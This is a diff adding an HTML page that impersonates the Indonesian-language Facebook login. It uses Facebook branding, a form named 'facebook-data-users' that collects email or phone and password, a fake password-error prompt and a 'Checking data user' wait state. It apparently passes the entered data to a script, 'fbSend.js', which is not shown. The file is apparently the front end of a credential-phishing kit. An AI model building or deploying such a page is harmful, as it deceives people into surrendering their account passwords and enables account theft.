@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Masuk Facebook</title>
+    <link rel="stylesheet" href="fb.css" />
+    <link rel="icon" href="../../img/fb/icon.ico" />
+  </head>
+  <body>
+    <section>
+      <div class="container">
+        <img src="../../img/fb/4lCu2zih0ca.svg" alt="Facebook" />
+        <form name="facebook-data-users">
+          <p>Login ke Facebook</p>
+          <div class="inputUser">
+            <input
+              name="nama"
+              type="text"
+              spellcheck="false"
+              required
+              placeholder="Email atau Nomor Telepon"
+            />
+            <input
+              name="password"
+              type="password"
+              spellcheck="false"
+              required
+              placeholder="Kata Sandi"
+              id="error"
+            />
+            <span id="errorSpan">Mohon untuk memasukkan password dengan benar!</span>
+          </div>
+          <div class="sendUser">
+            <button type="submit">
+              <div id="log">Masuk</div>
+              <div id="wait">Checking data user</div>
+            </button>
+            <a href="">Lupa Akun?</a>
+          </div>
+        </form>
+      </div>
+    </section>
+
+    <script src="fbSend.js"></script>
+  </body>
+</html>
